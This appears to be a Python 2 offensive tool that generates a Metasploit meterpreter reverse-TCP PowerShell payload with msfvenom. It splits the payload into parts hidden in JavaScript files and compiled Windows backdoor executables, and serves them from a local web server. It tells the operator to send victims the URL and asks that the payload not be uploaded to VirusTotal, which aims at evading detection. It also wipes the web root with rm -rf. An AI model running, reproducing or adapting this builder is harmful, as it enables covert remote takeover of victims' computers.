#!/usr/bin/python

import subprocess
from os import system, path
from distutils.dir_util import copy_tree
import sys



reset="\033[0;0m"
r="\033[38;5;9m"
by="\033[38;5;3m"
yb="\033[38;5;11m"
bl="\033[38;5;27m"
pur="\033[1;33;35m"
cy="\033[38;5;6m"
w="\033[38;5;7m"
o="\033[38;5;202m"
lb="\033[38;5;117m"
g="\033[38;5;2m"

cmark = u'\u2713'
cmark = cmark.encode('utf-8')







def banner():
	cloakText =  """
		  /$$$$$$  /$$                 /$$ /$$        /$$$$$$  /$$                     /$$      
		 /$$__  $$| $$                | $$| $$       /$$__  $$| $$                    | $$      
		| $$  \__/| $$$$$$$   /$$$$$$ | $$| $$      | $$  \__/| $$  /$$$$$$   /$$$$$$ | $$   /$$
		|  $$$$$$ | $$__  $$ /$$__  $$| $$| $$      | $$      | $$ /$$__  $$ |____  $$| $$  /$$/
 		 \____  $$| $$  \ $$| $$$$$$$$| $$| $$      | $$      | $$| $$  \ $$  /$$$$$$$| $$$$$$/ 
 	 	 /$$  \ $$| $$  | $$| $$_____/| $$| $$      | $$    $$| $$| $$  | $$ /$$__  $$| $$_  $$ 
		|  $$$$$$/| $$  | $$|  $$$$$$$| $$| $$      |  $$$$$$/| $$|  $$$$$$/|  $$$$$$$| $$ \  $$
 		 \______/ \__|  |__/ \_______/|__/|__/       \______/ |__/ \______/  \_______/|__/  \__/
                                                                                        
                                                                                        
                                                                                        
                                                                     
                                                                                        
	
                                            Author: {}{}{}

                                         Github: {}{}{}
									
""".format(g, "Tarek Talaat", reset, g, "www.github.com/nixpal", reset)
	print cloakText
	cloak = """


                                               
                                                     '+o` 
                                                    /ddd+` 
                                                   /mmm ms` 
                                                   hmn  nmd`        
                                                   ym    Mm` 
                                                 -/sd    Nm+.
                                                hmmmm\  /mmmms 
                                               ommmmmmmmmmmmmd-
                                              .dmmmmmmmmmmmmmm+     
                                              ommmmmmm mmmmmmmd` 
                                             `dmmmmmm   mmmmmmm/ 
                                             :mmmmmm     mmmmmmh` 
                                             ymmmmm       mmmmmmm.
                                            `mmmmm         mmmmmm- 
                                            -mmmm            mmmmm 
                                            +mmm              mmms 
                                            sNm                mmh 
                                            hNm                mmh
                                           `mNm                mmn
                                           .mNN                mmh
                                           :mNN................mmo
                                                 
 


 
"""

	print "{}{}{}".format(w, cloak, reset)





left_sign = "{}[{}+{}]{}".format(g, r, g, reset)


def config():
	
	if path.exists('psEncoded.ps1'):
		system('rm -rf psEncoded.ps1')

	print "{} Generating shellcode..".format(left_sign)
	cmd = 'msfvenom --platform windows --payload windows/meterpreter/reverse_tcp LHOST={} LPORT={} --format psh --smallest 2>/dev/null|msfvenom --payload - --platform win --arch x86 --encoder base64/base64 --out psEncoded.ps1 NOEXIT SYSWOW64 2>/dev/null'.format(IP, PORT)
	system(cmd)
	if path.exists('psEncoded.ps1'):
		print("{} {}Done {}{}{}{}".format(left_sign, g, reset, w, cmark, reset))
		print "{} Powershell meterpreter Reverse_tcp payload has been generated.".format(left_sign)



def bdoorOpen(bdName, part1, part2, part3, patt1, patt2, patt3):

	f = open('/root/udback_build/'+bdName, "rt")
	data = f.read()
	data = data.replace('<PATTERN1>', patt1)
	data = data.replace('<PATTERN2>', patt2)
	data = data.replace('<PATTERN3>', patt3)
	data = data.replace('<len1>', str(len(part1) - len(patt1)))
	data = data.replace('<len2>', str(len(part2) - len(patt2)))
	data = data.replace('<len3>', str(len(part3) - len(patt3)))

	f.close()

	f = open('/root/udback_build/'+bdName, "wt")
	f.write(data)
	f.close()



def trimShell():

	
	Part1 = ""
	Part2 = ""
	Part3 = ""
	
	
	#for x in range(0, First_Part_Len):
	#	Part1 += lines[x]
	#for x in range(First_Part_Len, shellLen):
	#	Part2 += lines[x]
	print "\n"
	print "           --=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--          "           
	print "----------[ {}{}{}  ]----------".format(w, "This Pattern will mark the end of the first and second part of the shellcode", reset)
	print "           --=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--          "

	print "\n"
	patt1 = raw_input("{} Enter first pattern: ".format(left_sign))
	patt2 = raw_input("{} Enter second pattern: ".format(left_sign))
	patt3 = raw_input("{} Enter third pattern: ".format(left_sign))


	with open("psEncoded.ps1") as f:
		lines = f.read().rstrip()
		lines = lines.split("-EncodedCommand ")[1]
	avg = len(lines)/3
	Part1 += lines[0:avg]
	Part2 += lines[avg:avg+avg]
	Part3 += lines[avg+avg:]

	Part1 += patt1
	Part2 += patt2
	Part3 += patt3

	print("{} {}Done {}{}{}{}".format(left_sign, g, reset, w, cmark, reset))
	Parts_to_return = {'Part1': Part1, 'Part2':Part2, 'Part3': Part3, 'patt1': patt1, 'patt2': patt2, 'patt3':patt3}
	return Parts_to_return


def final(Part1, Part2, Part3, patt1, patt2, patt3):


	bdName = raw_input("{} Enter backdoor file name: ".format(left_sign))
	
	print "{} Copying web files..".format(left_sign)
	system('rm -rf /var/www/html/*.*')
	system('rm -rf ./udback_build/*.exe 2>/dev/null')
	copy_tree('html_files', '/var/www/html')
	copy_tree('udbackdoor', 'udback_build')

	f = open('/var/www/html/cyber.js', "rt")
	data = f.read()
	data = data.replace('<shellPart1>', Part1)
	f.close()

	f = open('/var/www/html/cyber.js', "wt")
	f.write(data)
	f.close()


	f = open('/var/www/html/cyber2.js', "rt")
	data = f.read()
	data = data.replace('<shellPart2>', Part2)
	f.close()

	f = open('/var/www/html/cyber2.js', "wt")
	f.write(data)
	f.close()



	f = open('/var/www/html/cyber3.js', "rt")
	data = f.read()
	data = data.replace('<shellPart3>', Part3)
	f.close()

	f = open('/var/www/html/cyber3.js', "wt")
	f.write(data)
	f.close()




	
	if ".exe" not in bdName:
		bdName += ".exe"

	f = open('/var/www/html/download.html', "rt")
	data = f.read()
	
	data = data.replace('<file_name>', "f"+bdName)
	f.close()

	f = open('/var/www/html/download.html', "wt")
	f.write(data)
	f.close()


	f = open('/var/www/html/downloadc.html', "rt")
	data = f.read()
	
	data = data.replace('<file_name>', bdName)
	f.close()
	f = open('/var/www/html/downloadc.html', "wt")
	f.write(data)
	f.close()
	
	bdoorOpen("udshell.c", Part1, Part2, Part3, patt1, patt2, patt3)
	bdoorOpen("udshellfire.c", Part1, Part2, Part3, patt1, patt2, patt3)

	print "{} Compiling..".format(left_sign)

	system('i686-w64-mingw32-gcc -o /root/udback_build/%s /root/udback_build/udshellfire.c' % ("f"+bdName ))
	system('i686-w64-mingw32-gcc -o /root/udback_build/%s /root/udback_build/udshell.c' % (bdName))
	system('cp /root/udback_build/%s /var/www/html/' %(bdName))
	system('cp /root/udback_build/%s /var/www/html/' %("f"+bdName))

	print("{} {}Done {}{}{}{}".format(left_sign, g, reset, w, cmark, reset))

	print "{} Send victim your webserver URL  E.g http://{}{}{}/".format(left_sign, g, IP, reset)
	print "           --=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--        "
	print "----------[ {}{}{} {}{}{} ]----------".format(w, "Make sure you open MSFconsole and listen for your payload on port", reset, g, PORT, reset)
	print "           --=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--        "
	print "\n"

	print "-----------------------[ {}{}{} ]-----------------------".format(r, "PLEASE DO NOT UPLOAD TO VIRUS TOTAL", reset)




banner()
IP = raw_input("{} Enter Local IP for Reverse connection: ".format(left_sign))
PORT = raw_input("{} Enter Local PORT for Reverse connection: ".format(left_sign))
config()
x = trimShell()
Part1 = x['Part1']
Part2 = x['Part2']
Part3 = x['Part3']
patt1 = x['patt1']
patt2 = x['patt2']
patt3 = x['patt3']
final(Part1, Part2, Part3, patt1, patt2, patt3)



